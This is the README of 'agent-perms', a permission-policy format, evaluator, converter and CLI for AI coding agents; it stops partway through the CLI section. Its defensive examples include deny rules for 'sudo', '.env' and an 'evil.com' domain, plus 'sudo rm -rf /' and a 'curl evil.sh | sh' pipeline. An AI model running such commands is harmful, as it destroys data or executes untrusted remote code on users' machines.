# agent-perms

[![npm version](https://img.shields.io/npm/v/agent-perms.svg)](https://www.npmjs.com/package/agent-perms)
[![License](https://img.shields.io/badge/License-Apache--2.0-lightgrey.svg)](LICENSE)
[![CI](https://img.shields.io/github/actions/workflow/status/Mearman/agent-permissions/ci.yml?branch=main)](https://github.com/Mearman/agent-permissions/actions)

A vendor-neutral permission policy format for AI coding agents. One file works across Claude Code, OpenAI Codex, OpenCode, Crush, Oh My Pi, and any agent that adopts the spec.

## Quick start

Create `.agents/permissions.json` in your project root:

```json
{
  "$schema": "https://github.com/Mearman/agent-permissions/releases/latest/download/agent-permissions.schema.json",
  "defaultMode": "standard",
  "rules": [
    { "tool": "Bash", "pattern": "sudo:*", "tier": "deny" },
    { "tool": "Read", "pattern": "./.env", "tier": "deny" },
    { "tool": "Bash", "pattern": "npm publish:*", "tier": "deny" },
    { "tool": "Bash", "pattern": "git status", "tier": "allow" },
    { "tool": "Bash", "pattern": "git:*", "tier": "allow" },
    { "tool": "Read", "tier": "allow" },
    { "tool": "Grep", "tier": "allow" },
    { "tool": "Bash", "pattern": "git push:*", "tier": "ask" },
    {
      "tool": "Bash",
      "pattern": "npm run *",
      "tier": "allow",
      "when": { "cwd": "./packages/*" }
    }
  ]
}
```

Every rule has a `tool`, an optional `pattern`, a `tier` (deny/ask/allow), and optional `when` conditions. Evaluation is deny-first: all deny rules are checked, then ask, then allow. Falls back to `defaultMode` when no rule matches.

**Zero-translation migration:** `jq '.permissions' .claude/settings.json > .agents/permissions.json` still works. The schema accepts Claude Code's `permissions.allow/deny/ask` arrays and the loader normalises them into rules.

## Why

Every coding agent has its own permission config. Teams using multiple agents (or migrating between them) maintain separate, often contradictory permission files. This spec provides:

- **One policy, many agents**: write once, convert to any agent's native format
- **Zero-translation migration**: Claude Code's `permissions` block is valid input
- **Superset coverage**: expresses features from all supported agents (sandboxing, named profiles, per-agent overrides, conditional rules)
- **IDE support**: JSON Schema for autocomplete and validation ([on SchemaStore](https://schemastore.org))

## File location

| File                             | Purpose            | Git        |
| -------------------------------- | ------------------ | ---------- |
| `.agents/permissions.json`       | Team-shared policy | Committed  |
| `.agents/permissions.local.json` | Personal overrides | Gitignored |

Both files are merged at load time. Deny rules from any source short-circuit before allow rules.

## Installation

### As an MCP server

#### CLI shorthand

Some agent harnesses provide a one-command install:

**Claude Code (MCP):**

```bash
claude mcp add agent-perms -- npx -y agent-perms mcp
```

**Claude Code (plugin marketplace):**

```
/plugin marketplace add https://github.com/Mearman/agent-permissions.git
/plugin install agent-perms@agent-perms
```

**OpenAI Codex:**

```bash
codex mcp add agent-perms -- npx -y agent-perms mcp
```

#### Manual configuration

For harnesses that use config files, add the following to the `mcpServers` section:

```json
{
  "agent-perms": {
    "command": "npx",
    "args": ["-y", "agent-perms", "mcp"]
  }
}
```

| Harness     | Config file                                     | Config key                  |
| ----------- | ----------------------------------------------- | --------------------------- |
| Claude Code | `.mcp.json` (project) / `~/.claude.json` (user) | `mcpServers`                |
| Codex       | `~/.codex/config.toml`                          | `[mcp_servers.agent-perms]` |
| Gemini CLI  | `~/.gemini/settings.json`                       | `mcpServers`                |
| Crush       | `.crush.json` / `~/.config/crush/crush.json`    | `mcp`                       |
| Cline       | `.cline/mcp.json`                               | `mcpServers`                |
| Cursor      | `.cursor/mcp.json`                              | `mcpServers`                |

The MCP server is a background sync daemon. It reads config from `.agents/permissions.json` and keeps native agent config files in sync. By default it exposes no tools; with `--permission-prompt` it also exposes a tool that answers permission prompts from the policy (see [Permission-prompt tool](#permission-prompt-tool)).

### As a library

```bash
pnpm add agent-perms
```

## Exports

The package uses [wildcard exports](https://nodejs.org/api/packages.html#subpath-patterns): import only what you need.

### Programmatic API (`agent-perms/api`)

Side-effect-free functions for use as a library:

```typescript
import {
  convert,
  validate,
  check,
  replay,
  suggest,
  detectFormat,
} from "agent-perms/api";

// Convert between formats (auto-detects source)
const result = convert(undefined, "canonical", claudeCodeJson);
result.output; // canonical object
result.from; // "claude-code" (detected)
result.ruleCount; // 3

// Validate a policy
const { valid, errors } = validate(json);

// Evaluate a tool call
const { decision } = check("Bash", "sudo rm -rf /", policy, { branch: "main" });
// decision: "allow" | "deny" | "ask"

// Replay a policy over a session transcript (JSON Lines text)
const { counts, differing } = replay(policy, transcriptText);
// counts: { allow, ask, deny }; differing: calls the transcript recorded differently

// Propose allow rules for calls approved at least twice
const suggestions = suggest(transcriptText, { minCount: 2, policy });
// [{ rule: { tool: "Bash", pattern: "npm run:*", tier: "allow" }, count: 3 }]

// Detect format from structure
const format = detectFormat(json); // "claude-code" | "crush" | "kiro" | ...
```

### Other modules

```typescript
// Zod schemas (single source of truth)
import { AgentPermissionPolicy } from "agent-perms/schema";

// Deny-first evaluator
import { evaluate } from "agent-perms/evaluate";

// Transcript parsing, replay and rule suggestion over plain evaluator policies
import { parseTranscript, replayCalls, suggestRules } from "agent-perms/replay";

// Multi-layer policy loader
import { loadPolicy } from "agent-perms/loader";

// Bidirectional codecs for each agent
import { claudeCodeCodec } from "agent-perms/compat/codecs";

// SDK enum alignment checks
import { claudeCodeModes } from "agent-perms/compat/enums";

// Sync filesystem configs
import { sync } from "agent-perms/sync";

// Generate a policy confining the file tools to directories
import { confine } from "agent-perms/confine";

// Answer a host's permission prompts from the policy
import { createPermissionPrompt } from "agent-perms/prompt-tool";
```

## Schema overview

```typescript
import { type AgentPermissionPolicy } from "agent-perms/schema";

// All fields are optional. A valid policy can be as minimal as `{}`.
interface AgentPermissionPolicy {
  $schema?: string;

  // Default mode: standard | autonomous | restricted | readonly
  // Also accepts Claude Code modes: plan | dontAsk | acceptEdits | bypassPermissions
  defaultMode?: PermissionMode;

  activeProfile?: string;

  // Permission rules (deny-first evaluation)
  rules?: Array<{
    tool: string; // e.g. "Bash", "Read", "mcp__github__*"
    pattern?: string; // absent = match any input for this tool
    tier: "allow" | "deny" | "ask";
    when?: { cwd?: string; branch?: string }; // AND logic
  }>;

  // Claude Code compat: string rule arrays (normalised to rules on load)
  permissions?: {
    allow?: string[];
    deny?: string[];
    ask?: string[];
    additionalDirectories?: string[];
    defaultMode?: PermissionMode;
  };

  profiles?: Record<string, PermissionTiers>;

  delegation?: {
    maxDepth?: number;
    nonDelegable?: string[];
    bubbleUp?: boolean;
    agents?: Record<string, PermissionTiers>;
  };

  sandbox?: {
    mode?: "readonly" | "workspace-write" | "full-access";
    writableRoots?: string[];
    networkAccess?: boolean;
  };

  network?: {
    enabled?: boolean;
    domains?: Record<string, "allow" | "deny">;
  };

  env?: Record<string, string>;
}
```

## Rule syntax

Rules use `Tool(pattern)` strings inside `permissions` arrays, compatible with Claude Code's permission format. In the unified `rules` array, the tool and pattern are separate fields:

| Rule object                                    | `permissions` string    | Type       | Matches                            |
| ---------------------------------------------- | ----------------------- | ---------- | ---------------------------------- |
| `{ tool: "Read" }`                             | `Read`                  | Bare       | All invocations of `Read`          |
| `{ tool: "Bash", pattern: "git status" }`      | `Bash(git status)`      | Exact      | Exactly `git status`               |
| `{ tool: "Bash", pattern: "npm:*" }`           | `Bash(npm:*)`           | Prefix     | `npm` + space + anything           |
| `{ tool: "Bash", pattern: "git commit *" }`    | `Bash(git commit *)`    | Wildcard   | `git commit` + anything            |
| `{ tool: "Bash", pattern: "domain:evil.com" }` | `Bash(domain:evil.com)` | Domain     | Commands containing `evil.com`     |
| `{ tool: "mcp__github" }`                      | `mcp__github`           | MCP server | All tools from `github` MCP server |

### Evaluation order

```
deny rules → ask rules → allow rules → defaultMode
```

Deny short-circuits: if any deny rule matches, the tool is blocked regardless of allow rules from any source.

### Actors, roles and approvers

For hosts that know who is acting, a rule can depend on the actor and the roles they hold. The policy never says who holds a role; the host does, and passes `actor` and `roles` with each call.

```json
{
  "roles": {
    "maintainer": { "allow": ["Bash(git push:*)"] },
    "contractor": { "deny": ["Bash(git push:*)"] }
  },
  "rules": [
    {
      "tool": "Bash",
      "pattern": "npm publish:*",
      "tier": "ask",
      "approvers": {
        "roles": ["maintainer"],
        "actors": ["ada"],
        "timeoutSeconds": 300
      }
    },
    {
      "tool": "Bash",
      "pattern": "deploy:*",
      "tier": "deny",
      "when": { "actor": "contractor-*" }
    }
  ]
}
```

A role's rules apply as if each carried `when: { role }`. `when.actor` and `when.role` are globs, and a call whose actor or roles the host did not report is unknown, not anonymous: an unknown condition never lets an allow apply and still lets a deny or ask apply. An empty role list is known, and means the actor holds nothing.

`approvers` on an ask rule says who may resolve the request; `explain` reports it on the step, without the requester. Holding a permission does not make an actor an approver: only being named does. An unresolved request expires as a deny, after `timeoutSeconds` if given. The pending-request store and any approval interface belong to the host.

No agent format can limit a rule to an actor or a role, so a codec never writes one as unconditional: an allow limited that way is left out, which is stricter, and a deny or ask limited that way, or an ask that names `approvers`, makes the conversion fail with an `UnsupportedCapabilityError` listing the rule.

### Hidden tools

A deny rule with `hidden: true` refuses the call exactly as a plain deny does, and also marks the tool as one to leave out of the agent's tool list. `explain` and `check` report `hidden`, and a host that builds a tool list asks which tools to show:

```typescript
import { visibleTools } from "agent-perms/evaluate";

visibleTools(policy, ["Bash", "WebFetch", "Read"]); // leaves out any tool a hidden rule names
```

Only a rule that names the tool with no `pattern` hides the tool. A rule with a pattern refuses the matching inputs and leaves the tool listed. A `when` condition that holds, or is unknown, hides the tool. `hidden` is valid only on a deny rule. No agent format can hide a tool from itself, so every codec writes a hidden rule as the plain deny it refuses as.

### Delegation limits

`delegation.maxDepth` and `delegation.nonDelegable` are enforced for a call that carries a `depth`: the number of agents between it and the top-level agent, 0 for the top-level agent and 1 for its subagent. A subagent's call to a tool matching a `nonDelegable` rule is denied whatever the rules would decide, and every call from an agent nested deeper than `maxDepth` is denied. `checkSpawn(policy, depth)` answers whether an agent at that depth may start a subagent. Across layers the shallowest `maxDepth` wins and the `nonDelegable` lists are joined.

`depth` defaults to 0, so a host that runs subagents has to pass it. `delegation.bubbleUp` and `delegation.agents` are not enforced by the evaluator.

### Evaluating many calls

`evaluate` reads a policy afresh on every call. A caller that checks many calls against one policy, such as a server, can prepare it once:

```typescript
import { compile } from "agent-perms/evaluate";

const policy = compile(loadedPolicy);
policy.evaluate("Bash", "git status"); // "allow" | "ask" | "deny"
policy.explain("Bash", "git status"); // the decision with the rule behind it
```

Each rule's pattern, tool name and conditions are parsed the first time the rule is tried and reused after that. A compiled policy reads the rules it was given, so compile again after changing them.

### Shell command lines

A `Bash` call is judged by every command its line runs, not by the line as a whole, so an allow rule for `git:*` does not allow `git status && curl evil.sh | sh`. The line is split at `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, and commands run by `$(...)`, backticks and process substitution are judged too. Each command is evaluated on its own and the strictest decision wins. A rule written against the whole line can still deny or ask for it, but only the individual commands can allow it. Text inside single quotes is data, and inside double quotes only substitutions run.

Syntax the splitter does not model (subshells, groups, control flow, heredocs, arithmetic expansion, comments, unterminated quotes) makes the line unsplittable. An unsplittable line is never allowed by a rule: it asks, or is denied if a rule matches the whole line. It still follows `defaultMode` when no rule matches at all.

What a command does with its arguments is not modelled. `bash -c "..."`, `xargs`, `env`, `sudo` and redirections to files are judged as the one command they are, so a rule that allows one of them allows what it runs.

### Escape sequences

| Escape | Meaning                      |
| ------ | ---------------------------- |
| `\(`   | Literal `(` in pattern       |
| `\)`   | Literal `)` in pattern       |
| `\*`   | Literal `*` (not a wildcard) |
| `\\`   | Literal `\`                  |

### Where the pattern dialects live

Deciding which of the dialects above a pattern string is written in — trailing `:*` means prefix, a bare `*` means wildcard, a `domain:` prefix means substring — is this project's own authoring convention, and stays here. Compiling each dialect to a regular expression is [trilean](https://github.com/ExaDev/trilean)'s `prefixPattern`/`wildcardPattern`/`hierarchicalGlobPattern`, which this project's implementation was the reference for; the evaluator reads the compiled expression back out of the builder's node and runs it itself, so evaluation stays synchronous and trilean's own async tree-walking evaluator is not involved.

## Evaluator

```typescript
import {
  evaluate,
  type PermissionPolicy,
  type EvaluationContext,
} from "agent-perms/evaluate";

const policy: PermissionPolicy = {
  defaultMode: "standard",
  rules: [
    { tool: "Bash", pattern: "sudo:*", tier: "deny" },
    { tool: "Bash", pattern: "git:*", tier: "allow" },
    { tool: "Read", tier: "allow" },
  ],
};

// Returns "deny" | "ask" | "allow"
evaluate(policy, "bash", "git status"); // "allow"
evaluate(policy, "bash", "sudo rm -rf /"); // "deny"
evaluate(policy, "bash", "npm install"); // "ask" (falls through to defaultMode)

// With context for conditional rules
const ctx: EvaluationContext = { cwd: "./packages/api", branch: "main" };
evaluate(policy, "bash", "npm run build", ctx);
```

Tool names are matched case-insensitively (`Bash` matches `bash`).

### Converting string rules

```typescript
import { normaliseStringRule } from "agent-perms/evaluate";

// Convert Claude Code-style string rules to structured rules
const rule = normaliseStringRule("Bash(npm:*)", "allow");
// → { tool: "Bash", pattern: "npm:*", tier: "allow" }
```

## Policy loader

```typescript
import { loadPolicy } from "agent-perms/loader";

const policy = await loadPolicy({ cwd: process.cwd() });
```

Walks up from `cwd` looking for `.agents/permissions.json` and native agent configs. The policy file itself controls discovery via `with`, `without`, and `up` fields:

```json
{
  "with": ["claude-code", "opencode"],
  "up": 3,
  "rules": [...]
}
```

- `with`: only load these native configs (default: canonical only)
- `without`: load all except these
- `up`: how many parent directories to walk (default: `"all"`)

Loads and merges layers in order (outermost-first, last-defined-wins for `defaultMode`):

1. `.agents/permissions.json` (team-shared, discovered via walk-up)
2. `.agents/permissions.local.json` (personal overrides, discovered via walk-up)
3. Native agent configs (`.claude/settings.json`, `opencode.json`, etc.), if `with`/`without` enables them

The loader normalises all `permissions` string arrays into structured `rules`. Deny rules from any layer short-circuit. Allow rules are additive.

### Ceiling layers

A layer can bound the layers after it. Set `"ceiling": true` in a policy file (an organisation's, say) and the allow rules of layers loaded later, meaning deeper directories and local overrides, only take effect where that file also allows. They can still add `deny` and `ask` rules, and they can only make the default mode stricter.

```json
{
  "ceiling": true,
  "defaultMode": "restricted",
  "rules": [{ "tool": "Bash", "pattern": "git:*", "tier": "allow" }]
}
```

A project under that file can allow `git status`, which the ceiling already allows, but an allow for `npm run *` is ignored. A ceiling that allows nothing bounds nothing, and a ceiling never bounds layers before it. `mergeLayerPolicies` does the same for layers you supply yourself, each with a source name that `explain` reports.

## Agent compatibility

Bidirectional codecs convert between the canonical format and each agent's native config:

```typescript
import {
  claudeCodeCodec,
  codexCodec,
  encodeCodex,
} from "agent-perms/compat/codecs";

// Decode agent-native → canonical
const policy = claudeCodeCodec.decode(claudeSettings.permissions);

// Encode canonical → agent-native
const codexConfig = codexCodec.encode(canonicalPolicy);

// Codex config plus the execpolicy rules file for command rules
const { config, rules } = encodeCodex(canonicalPolicy);
```

| Agent           | Native format                                           | Codec             | Fidelity          |
| --------------- | ------------------------------------------------------- | ----------------- | ----------------- |
| **Claude Code** | `Tool(pattern)` rule strings in `.claude/settings.json` | `claudeCodeCodec` | Exact⁵            |
| **OpenCode**    | Per-tool `ask/allow/deny` objects in `config.json`      | `opencodeCodec`   | Exact or refused¹ |
| **Codex**       | Named profiles + sandbox in TOML config                 | `codexCodec`      | Exact or refused² |
| **Crush**       | Tool allowlist in `config.json`                         | `crushCodec`      | Allow only³       |
| **Oh My Pi**    | Ordered `bash.patterns` in `config.yml`                 | `ompCodec`        | Exact or refused⁴ |

¹ OpenCode's agent-specific tools have no canonical equivalent. Per-agent markdown overrides must be handled by the caller. A `deny` or `ask` for a tool OpenCode has no setting for makes the encode fail with an `UnsupportedCapabilityError`, and two rules on one pattern are written as the stricter.

² Codex's `on-failure` approval policy and granular approval config have no canonical equivalent. TOML serialisation is the caller's responsibility; the codec works on parsed JS objects.

Encoding never weakens a restrictive rule. Codex can enforce a `deny` on a path (read-only or no access) and a `deny` on a network domain, plus a `deny` on writes when the policy has a read-only sandbox. Any other `deny` or `ask` rule, and any `deny` or `ask` rule carrying a `when` condition, makes the encode throw `UnsupportedCapabilityError`, which lists every refused rule and why. An `allow` rule with no Codex equivalent is left out, which can only make the result stricter. Restrictions from the top-level rules are carried into every named profile.

A path deny becomes a Codex filesystem entry: `deny` for `Read`, `read` for `Write` or `Edit`. A `./` path is written as a subpath of `:workspace_roots` (`./secrets` becomes `secrets` in that table) and an absolute path stays an absolute key. Codex applies an entry to the path and everything under it, and the workspace roots include any Codex adds beyond the working directory, so the written entry is never narrower than the rule; a trailing `/*` or `/**` is written as that same subtree. A nested entry is written at least as strict as a denied ancestor, since Codex lets the more specific entry win. Any other path pattern is refused: a wildcard anywhere but the end, a string prefix (`:*`), `~`, a bare relative path, a `.` or `..` segment, or `*`, `?`, `[` or `]` in the path, which Codex would read as glob syntax. Decoding reads an absolute key or a `:workspace_roots` subpath back as the path plus its `/**` subtree, reads Codex's legacy `none` as `deny`, and fails on a `read` or `deny` entry it cannot place (another special root, a `~` path or a glob) rather than dropping it.

Codex enforces command rules through execpolicy rules files, not its config, so `codexCodec` on its own refuses a command `deny` or `ask`. `encodeCodex(policy)` returns `{ config, rules }`, where `rules` is the content of a Starlark rules file (or `undefined` when there are none) that belongs at `CODEX_EXECPOLICY_RULES_PATH` (`rules/agent-perms.rules`) beside the config, since Codex loads every `*.rules` file in the `rules` directory of each config layer (`~/.codex/rules`, a project's `.codex/rules`). A command `deny` becomes `prefix_rule(pattern = [...], decision = "forbidden")` and an `ask` becomes `decision = "prompt"`, keeping the stricter decision when both name one prefix. Only patterns a prefix rule matches exactly are written: `git push:*`, and `git push *` whose only wildcard is the trailing one, both match the words alone or followed by arguments, which is what Codex matches once it has split the command into words. An exact command (a prefix rule would widen it), a wildcard anywhere else, a word with quoting, escapes or shell syntax, an empty word, a leading variable assignment, a tool-wide `Bash` rule and a command rule in a named profile (a rules file applies to every profile) are refused. A command `allow` is left out. Codex applies prefix rules to each command of a script it can split into plain commands (joined by `&&`, `||`, `;` or `|`); a script it cannot split, such as one with a redirection or a command substitution, is matched as a whole and so is not caught by a rule on a command inside it. `agent-perms convert --to codex --output <file>` writes the rules file beside the output, and refuses to print to stdout when there is one; `sync` does not write Codex files.

³ Crush has only an allowlist of tools: no deny, no ask, no patterns. A `deny` or `ask` makes the encode fail with an `UnsupportedCapabilityError`; an `allow` with a pattern is left out, which is stricter.

⁴ Oh My Pi enforces `bash.patterns`: an ordered list of `match` globs (only `*` is special, whitespace is collapsed, the first matching entry wins) with approval `allow`, `prompt` or `deny`. Its `deny` and `prompt` entries also catch a matching command inside a compound line, and an `allow` entry never approves a compound line, which agrees with how a canonical policy judges a shell line. Encoding writes deny entries first, then prompt, then allow, because OMP takes the first match and a canonical policy takes the strictest. A canonical prefix rule (`git push:*`) and a trailing wildcard (`git *`) are each written twice, as the bare command and the command with arguments, since OMP's `git *` does not match `git`. `ask` becomes `prompt`. A `deny` or `ask` for any tool but Bash, one that carries a condition, one on a literal asterisk (OMP cannot write one), an actor or role limit, or an ask that names approvers makes the encode fail with an `UnsupportedCapabilityError`; an `allow` OMP cannot express is left out, which is stricter. OMP's default approval mode and its other settings are not converted, so a canonical default mode stricter than OMP's own does not carry over. Decoding reads the entries in order and fails on one it cannot read faithfully (a bad approval, an empty match, a match ending in `:*`) rather than skipping it. `agent-perms convert` reads and writes OMP's config as YAML; `sync` does not touch it.

⁵ Claude Code holds a rule as a `Tool(pattern)` string and nothing else, so a condition (`when`) is not written. An `allow` limited by a condition is left out, since it would otherwise apply everywhere; a `deny` or `ask` is written without it and applies everywhere, which is stricter. A canonical default mode Claude Code has no name for is written as the closest one that is not looser: `readonly` as `dontAsk`, `restricted` and `standard` as `default`. Claude Code's own `dontAsk` refuses every call no rule allows, and is read that way.

### Zero-translation migration from Claude Code

```bash
jq '.permissions' .claude/settings.json > .agents/permissions.json
```

This works because the canonical spec accepts Claude Code's rule syntax, mode values, and `defaultMode` placement unchanged. The loader normalises `permissions` arrays into structured `rules`.

### MCP sync server

```typescript
import { createMcpServer, startMcpServer } from "agent-perms/mcp";
```

A background sync daemon that keeps native agent config files bidirectionally synced with `.agents/permissions.json`. It exposes no tools unless the permission-prompt mode is on. `startMcpServer(options)` serves on stdio from the current directory and runs the sync; `createMcpServer(root, options)` builds the server without connecting it or syncing, for a host that supplies its own transport. Sync is configured via the `sync` field in the policy file:

```json
{
  "sync": {
    "mode": "watch",
    "backup": true
  }
}
```

- `mode: "sync"`: one-shot sync on startup
- `mode: "watch"`: continuous sync via `fs.watch`
- `mode: false`: disabled

Also available as the `agent-perms-mcp` binary.

### Permission-prompt tool

`agent-perms mcp --permission-prompt` adds one tool, `permission_prompt`, which answers Claude Code's permission prompts from the policy. Claude Code sends prompts to an MCP tool only in print mode (`claude -p`) with `--permission-prompt-tool`; an interactive session asks the person at the terminal and never calls the tool. The tool is consulted only for calls Claude Code would otherwise prompt for: a call its own settings already allow or deny never reaches it.

```bash
claude -p \
  --mcp-config '{"mcpServers":{"agent-perms":{"command":"npx","args":["-y","agent-perms","mcp","--permission-prompt"]}}}' \
  --permission-prompt-tool mcp__agent-perms__permission_prompt \
  "run the tests"
```

Claude Code calls the tool with `{ tool_name, input, tool_use_id }` and reads back one text block holding `{"behavior":"allow","updatedInput":{...}}` or `{"behavior":"deny","message":"..."}`. The tool loads the policy for the server's working directory on every prompt, so edits apply to the next call, and judges the call by one field of its input:

| Tool                                 | Judged by                                                |
| ------------------------------------ | -------------------------------------------------------- |
| `Bash`                               | `command`, split into its commands as in `check`         |
| `Read`, `Write`, `Edit`, `MultiEdit` | `file_path` (see below)                                  |
| `NotebookEdit`                       | `notebook_path` (see below)                              |
| `WebFetch`                           | `url`                                                    |
| `WebSearch`                          | `query`                                                  |
| Any other tool                       | its name alone, so only rules without a pattern match it |

A file path is resolved against the working directory and judged in both forms a policy may write it, absolute (as `confine` writes it) and `./`-relative (as in `./.env`) when it lies inside that directory. The strictest decision any rule reaches in either form wins, and the default mode decides only when neither form matches a rule. A call missing the field its tool is judged by is denied. An `allow` decision returns the input unchanged, and a `deny` returns a message naming the rule and the file it came from. The prompt has no third answer, so an `ask` decision is denied with a message naming the rule that asked, unless an approval handler settles it (below). A prompt carries no cwd or branch, so `when` conditions are unknown: they never allow a call, and may still deny it.

As a library, `createPermissionPrompt` answers prompts directly and takes the approval handler. The handler is where a host puts its own approval flow: showing the request to a person, holding it until someone approves it elsewhere, or consulting another policy. It receives the request, the matched subject and the full explanation, plus an abort signal that fires when the agent abandons the call.

```typescript
import { createPermissionPrompt } from "agent-perms/prompt-tool";
import { loadPolicy } from "agent-perms/loader";

const answer = createPermissionPrompt({
  loadPolicy: () => loadPolicy({ cwd: root }),
  root,
  context: { branch: "main" },
  onAsk: ({ request, subject, explanation }, signal) =>
    approvals.waitFor(request.tool_use_id, subject, explanation, signal),
});

const result = await answer(
  { tool_name: "Bash", input: { command: "git push" } },
  signal,
);
// { behavior: "allow", updatedInput: {...} } or { behavior: "deny", message: "..." }
```

To serve the tool with a handler, pass it to the server: `createMcpServer(root, { permissionPrompt: { onAsk } })`.

## CLI

The `agent-perms` binary converts, validates, confines, syncs, and serves permission configs.

**All flags, no positionals.** Format names resolve to default config file locations.
Use `-` for stdin/stdout.

```
claude-code  →  .claude/settings.json
canonical    →  .agents/permissions.json
opencode     →  opencode.json
kiro         →  .kiro/permissions.json
codex        →  codex.toml
crush        →  .crush.json
```

### convert

```bash
# Format name → reads/writes default config locations
agent-perms convert --from claude-code --to canonical

# File paths: auto-detects format from contents
agent-perms convert --from .claude/settings.json --to crush

# Piping with -
cat settings.json | agent-perms convert --from - --to canonical --output -

# Write to specific file
agent-perms convert --from claude-code --to canonical --output my-policy.json
```

| Flag        | Short | Aliases           | Description                                            |
| ----------- | ----- | ----------------- | ------------------------------------------------------ |
| `--from`    | `-f`  | `--input`, `--in` | Source (format, file, or `-` for stdin)                |
| `--to`      | `-t`  |                   | Target format or file (required)                       |
| `--output`  | `-o`  | `--out`           | Output file (overrides `--to` path), or `-` for stdout |
| `--compact` | `-c`  |                   | Single-line JSON                                       |
| `--verbose` | `-v`  |                   | Show decode/encode summary on stderr                   |

### validate

```bash
agent-perms validate --input canonical
agent-perms validate --input .agents/permissions.json
echo '...' | agent-perms validate --input -
```

| Flag      | Short | Aliases | Description                                  |
| --------- | ----- | ------- | -------------------------------------------- |
| `--input` | `-i`  | `--in`  | Policy file (format, file, or `-` for stdin) |

Exits 0 if valid, 2 with error details if not.

### check

```bash
agent-perms check --tool Bash --input "git status" --policy-file canonical
agent-perms check --tool Bash --input "git status" --policy-file .agents/permissions.json
```

| Flag                | Description                                  |
| ------------------- | -------------------------------------------- |
| `--tool`            | Tool name (required)                         |
| `--input`           | Tool input string (required)                 |
| `--policy-file`     | Policy file (format, file, or `-` for stdin) |
| `--cwd`, `--branch` | Evaluation context                           |
| `--explain`         | Print the rule and layer behind each step    |

Exits 0 with `allow` or 1 with `deny`.

### replay

```bash
agent-perms replay --transcript session.jsonl --policy-file canonical
```

| Flag            | Description                                  |
| --------------- | -------------------------------------------- |
| `--transcript`  | Session transcript (file, or `-` for stdin)  |
| `--policy-file` | Policy file (format, file, or `-` for stdin) |

Judges every tool call in the transcript against the policy and prints how many it would allow, ask about and deny, one `decision<TAB>count` line each. It then lists the calls whose recorded outcome the policy could not have produced, as `decision<TAB>outcome<TAB>tool<TAB>input`. A call that ran is consistent with `allow` or `ask`, a call a rule denied with `deny`, and a call the user declined with `ask`; a call with no recorded result is counted but never listed. Each call is judged in the working directory and branch recorded with it, so `when` conditions apply as they did at the time.

### suggest

```bash
agent-perms suggest --transcript session.jsonl --policy-file canonical > proposed.json
```

| Flag              | Description                                                      |
| ----------------- | ---------------------------------------------------------------- |
| `--transcript`    | Session transcript (file, or `-` for stdin)                      |
| `--policy-file`   | Policy whose deny rules exclude calls and allow rules cover them |
| `--min-count <n>` | Approved calls a rule must cover (default: 2)                    |

Prints a canonical policy of proposed `allow` rules on stdout, and each rule with how many approved calls it covers on stderr. Only calls that ran count as approved, and a `Bash` line counts command by command. A command is never proposed when it appeared in a line a policy rule denies or that the transcript records as denied or declined, and commands the policy already allows, or a rule asks about, are left out. Commands sharing a first word become one prefix rule on the words they all start with (`npm run build` and `npm run lint` give `npm run:*`), unless that prefix would also match an excluded command, in which case each repeated command gets an exact rule. Other tools get an exact rule on their path or URL, or a bare rule when the tool has no such input. Review the proposal before adopting it: a prefix rule allows arguments that were never observed.

### Transcript format

Both commands read Claude Code session logs (the `.jsonl` files under `~/.claude/projects/`). The parser reads `tool_use` blocks (`id`, `name`, `input`) and `tool_result` blocks (`tool_use_id`, `is_error`, `content`) from each entry's `message.content`, plus the entry's `cwd` and `gitBranch` as the call's context. The log records no environment variables or git remote, so a `when` condition on either is unknown during a replay: it can still deny or ask, but never allows. The input rules match against is `command` for `Bash`, `file_path` for `Read`, `Write`, `Edit` and `MultiEdit`, `notebook_path` for `NotebookEdit` and `url` for `WebFetch`. A log does not say which rule decided a call, or whether a call that ran was allowed outright or approved when asked; it records only the outcome, which is read from the result text: an error starting `Permission to use` and containing `has been denied` is a denial, an error starting `The user doesn't want to proceed with this tool use.` is a declined request, and anything else means the call ran.

### confine

```bash
agent-perms confine --root .
agent-perms confine --root . --root ../shared --output .agents/permissions.json
agent-perms confine --root ~/projects/app --outside deny
```

| Flag              | Description                                                        |
| ----------------- | ------------------------------------------------------------------ |
| `-r`, `--root`    | Directory the file tools may reach (required, repeatable)          |
| `--outside`       | `ask` (default) or `deny`: what happens to paths outside the roots |
| `-o`, `--output`  | Write to a file (or format name) instead of stdout                 |
| `-c`, `--compact` | Output compact JSON                                                |

Prints a canonical policy that allows `Read`, `Edit` and `Write` on each root and everything below it, and lists the roots other than the working directory under `permissions.additionalDirectories`. Relative roots resolve against the working directory; paths are made absolute, `.` and `..` segments are collapsed, trailing separators are dropped and duplicates are removed.

**What it can and cannot express.** Evaluation is deny-first and patterns are exact, `prefix:*` or `*` wildcards, none of which can negate. "Deny everything outside the roots" therefore cannot be written: a blanket deny would also beat the allow rules for the roots. Instead the policy:

- allows the file tools on `<root>` and `<root>/*`, so a sibling sharing the root as a string prefix (`/work/app-secrets` for `/work/app`) is not matched;
- denies any path containing a `..` segment, because the wildcard `/work/app/*` would otherwise match the text `/work/app/../secret`;
- sets `defaultMode` to `restricted` (outside paths ask) or, with `--outside deny`, `readonly` (outside paths are refused). That mode is global: it also applies to every other tool that has no rule of its own, so `readonly` refuses `Bash` calls that no rule allows.

Tool inputs are matched as literal text. A path given relative to the working directory matches no root rule and falls to the default mode.

**This is not a sandbox.** Only the file tools are constrained. A `Bash` command can still read or write anywhere, and other tools are untouched. To restrict what shell commands can reach, use the policy's `sandbox` field.

### sync

```bash
agent-perms sync
agent-perms sync --dry-run
agent-perms sync -w claude-code -w opencode
agent-perms sync -x codex
```

| Flag                | Short | Description                                |
| ------------------- | ----- | ------------------------------------------ |
| `--working-dir`     | `-d`  | Starting directory (default: cwd)          |
| `--up <n\|all>`     | `-u`  | Ascend n parent directories (default: all) |
| `--with <agent>`    | `-w`  | Only sync these agents (repeatable)        |
| `--without <agent>` | `-x`  | Sync all except these agents (repeatable)  |
| `--yes`             | `-y`  | Apply without prompting                    |
| `--dry-run`         |       | Show changes only, never write             |
| `--create`          | `-c`  | Create config files that don't exist       |
| `--verbose`         | `-v`  | Show rule provenance                       |
| `--backup`          | `-b`  | Write `.bak` files before overwriting      |

Sync merges rules with deny-first semantics (deny > ask > allow for same tool+pattern).
Most restrictive `defaultMode` wins.

If an agent's codec refuses a rule in the merged policy (see the compatibility table), sync reports the refused rules, writes nothing for any agent, and exits 1. Leave that agent out with `--without` to sync the others.

### mcp

```bash
agent-perms mcp
```

Starts the MCP sync daemon on stdio. Sync config comes from `.agents/permissions.json` via the `sync` field. Typically invoked by agent harnesses via `npx agent-perms-mcp`, not run directly.

| Flag                  | Description                                                                                 |
